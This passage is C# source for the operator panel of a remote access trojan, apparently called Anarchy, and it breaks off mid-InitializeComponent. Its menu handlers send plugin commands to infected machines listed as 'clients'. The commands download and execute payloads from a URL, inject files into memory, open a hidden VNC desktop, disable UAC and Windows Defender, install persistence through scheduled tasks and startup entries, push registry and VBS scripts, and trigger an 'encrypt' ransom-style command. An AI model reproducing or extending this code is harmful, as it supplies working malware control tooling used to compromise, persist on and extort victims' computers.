                        packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                        packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                    });
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void fromUrlToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
        string text;
        text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
        if (string.IsNullOrEmpty(text) || this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
            msgPack.ForcePathObject("url").AsString = text;
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\EVa7gBMKoaHmLC.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SendFileToMemoryToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
        try
        {
            FormSendFileToMemory formSendFileToMemory;
            formSendFileToMemory = new FormSendFileToMemory();
            formSendFileToMemory.ShowDialog();
            if (formSendFileToMemory.IsOK)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
                msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.foxLabel4.Tag.ToString())));
                if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
                {
                    msgPack.ForcePathObject("Inject").AsString = "";
                }
                else
                {
                    msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
                }
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\WkUP83aP9CABpi.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                foreach (Clients obj in selectedClients)
                {
                    obj.LV.ForeColor = Color.Red;
                    ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
                }
            }
            formSendFileToMemory.Close();
            formSendFileToMemory.Dispose();
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void guna2Button7_Click_1(object sender, EventArgs e)
    {
        this.listView1.SmallImageList = this.zzimageList1;
        this.listView1.LargeImageList = this.zzimageList1;
        this.zzimageList1.Images.SetKeyName(0, "--.png");
        this.guna2Button7.Visible = false;
        this.guna2Button8.Visible = true;
    }

    private void guna2Button8_Click_1(object sender, EventArgs e)
    {
        this.listView1.SmallImageList = this.imageList1;
        this.listView1.LargeImageList = this.imageList1;
        this.guna2Button7.Visible = true;
        this.guna2Button8.Visible = false;
    }

    private void ClientFolderToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
        try
        {
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            if (selectedClients.Length == 0)
            {
                Process.Start(Application.StartupPath);
                return;
            }
            Clients[] array;
            array = selectedClients;
            for (int i = 0; i < array.Length; i++)
            {
                string text;
                text = Path.Combine(path2: "ClientsFolder\\" + array[i].ID, path1: Application.StartupPath);
                if (Directory.Exists(text))
                {
                    Process.Start(text);
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void StopToolStripMenuItem1_Click_1(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "close";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void serverToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\hvnc.dll");
            foreach (Clients client in GetSelectedClients())
            {
                var hiddenDesktop = (FormHVNC)Application.OpenForms["HVNC:" + client.ID];
                if (hiddenDesktop == null)
                {
                    hiddenDesktop = new FormHVNC
                    {
                        F = this,
                        Name = "HVNC:" + client.ID,
                        Text = "HVNC:" + client.ID,
                        ParentClient = client,
                        FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
                    };
                    hiddenDesktop.Show();
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
            return;
        }

        //new FrmMain(Convert.ToInt32(Anarchy.Properties.Settings.Default.SavedPort) - 1).Show();
    }

    private void HBrowserMenuItem_Click(object sender, EventArgs e)
    {
        
    }

    private void HAppsMenuItem_Click(object sender, EventArgs e)
    {
        
    }

    private async void installToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = true;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            MsgPack packet;
            packet = new MsgPack();
            packet.ForcePathObject("Pac_ket").AsString = "sendFile";
            packet.ForcePathObject("Update").AsString = "false";
            MsgPack msgpack;
            msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PK0TcnqTGFagQTS.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients client in selectedClients)
            {
                client.LV.ForeColor = Color.Red;
                string[] fileNames;
                fileNames = openFileDialog.FileNames;
                foreach (string file in fileNames)
                {
                    await Task.Run(delegate
                    {
                        packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                        packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                    });
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void siticoneControlBox3_Click(object sender, EventArgs e)
    {
    }

    private void toolStripMenuItem3_Click(object sender, EventArgs e)
    {
    }

    private void builderToolStripMenuItem_Click(object sender, EventArgs e)
    {
        using HVNCForm hVNCForm = new HVNCForm();
        hVNCForm.ShowDialog();
    }

    private void guna2Button9_Click(object sender, EventArgs e)
    {
        this.guna2Panel4.Visible = false;
        this.guna2Button5.Visible = true;
        this.guna2Button9.Visible = false;
    }

    private void restartToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "restart";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void guna2Button6_Click(object sender, EventArgs e)
    {
    }

    private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
    {
    }

    private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
    {
    }

    private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
    {
    }

    private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void copyToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void toolStripMenuItem2_Click(object sender, EventArgs e)
    {
    }

    private void StarthVNC_Click(object sender, EventArgs e)
    {
    }

    private void StophVNC_Click(object sender, EventArgs e)
    {
    }

    private void guna2TrackBar1_Scroll(object sender, ScrollEventArgs e)
    {
    }

    private void copyToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
        if (this.listView2.SelectedItems.Count == 0)
        {
            return;
        }
        string text;
        text = string.Empty;
        foreach (ListViewItem selectedItem in this.listView2.SelectedItems)
        {
            text = selectedItem.SubItems.Cast<ListViewItem.ListViewSubItem>().Aggregate(text, (string current, ListViewItem.ListViewSubItem lvs) => current + lvs.Text + " : ");
            text = text.Remove(text.Length - 3);
            text += "\r\n";
        }
        ClipboardHelper.SetClipboardText(text);
    }

    private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void downloadAndExecuteToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog;
            openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
            msgPack.ForcePathObject("Update").AsString = "false";
            msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
            msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PK0TcnqTGFagQTS.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            ListViewItem listViewItem;
            listViewItem = new ListViewItem();
            listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
            listViewItem.SubItems.Add("0");
            listViewItem.ToolTipText = Guid.NewGuid().ToString();
            if (this.listView4.Items.Count > 0)
            {
                foreach (ListViewItem item in this.listView4.Items)
                {
                    if (item.Text == listViewItem.Text)
                    {
                        return;
                    }
                }
            }
            Login.form1.listView4.Items.Add(listViewItem);
            Login.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void updateAllClientsToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog;
            openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
            msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
            msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
            msgPack.ForcePathObject("Update").AsString = "true";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PK0TcnqTGFagQTS.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            ListViewItem listViewItem;
            listViewItem = new ListViewItem();
            listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
            listViewItem.SubItems.Add("0");
            listViewItem.ToolTipText = Guid.NewGuid().ToString();
            if (this.listView4.Items.Count > 0)
            {
                foreach (ListViewItem item in this.listView4.Items)
                {
                    if (item.Text == listViewItem.Text)
                    {
                        return;
                    }
                }
            }
            Login.form1.listView4.Items.Add(listViewItem);
            Login.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void downloadExecuteToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = Interaction.InputBox("\nPayload link.\n\n", "Url:");
            if (string.IsNullOrEmpty(text))
            {
                return;
            }
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
            msgPack.ForcePathObject("url").AsString = text;
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            ListViewItem listViewItem;
            listViewItem = new ListViewItem();
            listViewItem.Text = "SendFileFromUrl: " + Path.GetFileName(text);
            listViewItem.SubItems.Add("0");
            listViewItem.ToolTipText = Guid.NewGuid().ToString();
            if (this.listView4.Items.Count > 0)
            {
                foreach (ListViewItem item in this.listView4.Items)
                {
                    if (item.Text == listViewItem.Text)
                    {
                        return;
                    }
                }
            }
            Login.form1.listView4.Items.Add(listViewItem);
            Login.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void toolStripMenuItem20_Click(object sender, EventArgs e)
    {
    }

    private void persistenceDefeatUACToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            ListViewItem listViewItem;
            listViewItem = new ListViewItem();
            listViewItem.Text = "DisableUAC:";
            listViewItem.SubItems.Add("0");
            listViewItem.ToolTipText = Guid.NewGuid().ToString();
            if (this.listView4.Items.Count > 0)
            {
                foreach (ListViewItem item in this.listView4.Items)
                {
                    if (item.Text == listViewItem.Text)
                    {
                        return;
                    }
                }
            }
            Login.form1.listView4.Items.Add(listViewItem);
            Login.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: true));
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void persistenceDefeatWDToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            ListViewItem listViewItem;
            listViewItem = new ListViewItem();
            listViewItem.Text = "DisableDefedner:";
            listViewItem.SubItems.Add("0");
            listViewItem.ToolTipText = Guid.NewGuid().ToString();
            if (this.listView4.Items.Count > 0)
            {
                foreach (ListViewItem item in this.listView4.Items)
                {
                    if (item.Text == listViewItem.Text)
                    {
                        return;
                    }
                }
            }
            Login.form1.listView4.Items.Add(listViewItem);
            Login.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: true));
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void toolStripMenuItem8_Click(object sender, EventArgs e)
    {
    }

    private void toolStripMenuItem2_Click_1(object sender, EventArgs e)
    {
    }

    private void bulderToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private async void mergeregToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "reg files (*.reg)|*.reg|All files (*.*)|*.*";
            openFileDialog.Multiselect = true;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            MsgPack packet;
            packet = new MsgPack();
            packet.ForcePathObject("Pac_ket").AsString = "sendFile";
            packet.ForcePathObject("Update").AsString = "false";
            MsgPack msgpack;
            msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PK0TcnqTGFagQTS.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients client in selectedClients)
            {
                client.LV.ForeColor = Color.Red;
                string[] fileNames;
                fileNames = openFileDialog.FileNames;
                foreach (string file in fileNames)
                {
                    await Task.Run(delegate
                    {
                        packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                        packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                    });
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void addSheduleTaskToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void toolStripMenuItem51_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void toolStripMenuItem53_Click(object sender, EventArgs e)
    {
        if (this.listView1.SelectedItems.Count <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\KNTmoSnG.AnarHs.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            for (int i = 0; i < selectedClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private async void executeVBSToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "vbs files (*.vbs)|*.vbs|All files (*.*)|*.*";
            openFileDialog.Multiselect = true;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            MsgPack packet;
            packet = new MsgPack();
            packet.ForcePathObject("Pac_ket").AsString = "sendFile";
            packet.ForcePathObject("Update").AsString = "false";
            MsgPack msgpack;
            msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PK0TcnqTGFagQTS.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients client in selectedClients)
            {
                client.LV.ForeColor = Color.Red;
                string[] fileNames;
                fileNames = openFileDialog.FileNames;
                foreach (string file in fileNames)
                {
                    await Task.Run(delegate
                    {
                        packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                        packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                    });
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void toolStripMenuItem2_Click_2(object sender, EventArgs e)
    {
    }

    private async void sToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = true;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            MsgPack packet;
            packet = new MsgPack();
            packet.ForcePathObject("Pac_ket").AsString = "sendFile";
            packet.ForcePathObject("Update").AsString = "false";
            MsgPack msgpack;
            msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PK0TcnqTGFagQTS.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients client in selectedClients)
            {
                client.LV.ForeColor = Color.Red;
                string[] fileNames;
                fileNames = openFileDialog.FileNames;
                foreach (string file in fileNames)
                {
                    await Task.Run(delegate
                    {
                        packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                        packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                    });
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
    {
        using GForm0 gForm = new GForm0();
        gForm.ShowDialog();
    }

    private void mBRSettingsToolStripMenuItem_Click(object sender, EventArgs e)
    {
        using Musik musik = new Musik();
        musik.ShowDialog();
    }

    private void mBREncryptToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = this.textBox1.Text;
            if (!string.IsNullOrEmpty(text) && this.listView1.SelectedItems.Count > 0)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "encrypt";
                msgPack.ForcePathObject("Message").AsString = text;
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\59Zp7paEHDF7luJ.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
            this.ping = new System.Windows.Forms.Timer(this.components);
            this.UpdateUI = new System.Windows.Forms.Timer(this.components);
            this.ThumbnailImageList = new System.Windows.Forms.ImageList(this.components);
            this.performanceCounter1 = new System.Diagnostics.PerformanceCounter();
            this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.TimerTask = new System.Windows.Forms.Timer(this.components);
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.listView4 = new System.Windows.Forms.ListView();
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.downloadExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadAndExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.persistenceDefeatUACToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.persistenceDefeatWDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.updateAllClientsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.dELETETASKToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            this.Guna2CircleProgressBar2 = new Guna.UI2.WinForms.Guna2CircleProgressBar();
            this.guna2Button8 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button7 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button6 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button4 = new Guna.UI2.WinForms.Guna2Button();
            this.btnHide = new Guna.UI2.WinForms.Guna2Button();
            this.btnShow = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button5 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button9 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.pictureBox4 = new System.Windows.Forms.PictureBox();
            this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.guna2DragControl2 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.listView1 = new System.Windows.Forms.ListView();
